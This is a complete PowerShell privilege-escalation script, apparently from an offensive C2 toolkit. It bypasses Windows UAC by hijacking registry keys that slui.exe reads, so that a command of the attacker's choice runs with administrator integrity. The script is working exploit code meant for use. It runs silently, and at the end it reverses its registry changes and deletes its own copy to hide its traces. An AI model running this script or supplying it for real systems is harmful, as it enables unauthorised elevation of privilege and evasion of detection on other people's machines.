<#
.SYNOPSIS
   SluiEOP can be used for privilege escalation or to execute one command with high integrity (admin)

  Author: r00t-3xp10it (SSA RedTeam @2020)
  Tested Under: Windows 10 - 18363.778
  EOP Disclosure By: @mattharr0ey
  Required Dependencies: none
  Optional Dependencies: none
  PS Script Dev Version: v1.3

.DESCRIPTION
   How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
   called Windows Activation in SystemSettings, this service makes it easy for you and other users to change an old windows
   activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
   ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
   but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
   powershell.exe start-process slui.exe -verb runas

.NOTES
   SluiEOP.ps1 script was written to be executed in meterpeter C2 (does not display outputs)

.EXAMPLE
   PS C:\> powershell.exe -File SluiEOP.ps1 "powershell.exe"
   Execute powershell with high privileges (SYSTEM)

.EXAMPLE
   PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad"
   Execute notepad process with high privileges (SYSTEM)

.INPUTS
   None. You cannot pipe objects to SluiEOP.ps1

.OUTPUTS
   None. this script does not display any outputs.

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/SluiEOP.ps1
    https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b

#>


$IPath = pwd;
$Command = $Null;
$param1 = $args[0] # User Inputs [Arguments]
If(-not($param1) -or $param1 -eq $null){
   $Command = "$env:WINDIR\System32\cmd.exe"
}else{
   $Command = "$param1"
}

$CheckVuln = Test-Path -Path "HKCU:\Software\Classes\" -EA SilentlyContinue
If($CheckVuln){

   ### Add Entrys to Regedit {powershell}
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Seconds 1
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Seconds 1

   ## The Next Registry entry allow us execute our command under high privileges
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Seconds 1
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Force|Out-Null;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\PintoStartScreen" -Name "(default)" -Value '{470C0EBD-5D73-4d58-9CED-E91E22E23282}' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1

   ### Start vulnerable process {powershell}
   Start-Sleep -Seconds 2;start-process "$env:WINDIR\System32\Slui.exe" -Verb runas

   Start-Sleep -Seconds 1
   ### Revert Regedit to 'DEFAULT' settings after all testings done ..
   Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
   Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force;Start-Sleep -Seconds 2

}else{
   echo "   [ERROR]  System Doesn't Seems Vulnerable, Aborting .." > $env:TMP\fail.log
}


## Clean old files/configurations
If(Test-Path "$env:TMP\fail.log"){Get-Content -Path "$env:TMP\fail.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\fail.log" -Force -EA SilentlyContinue}
If(Test-Path "$env:TMP\SluiEOP.ps1"){Remove-Item -Path "$env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}

Exit
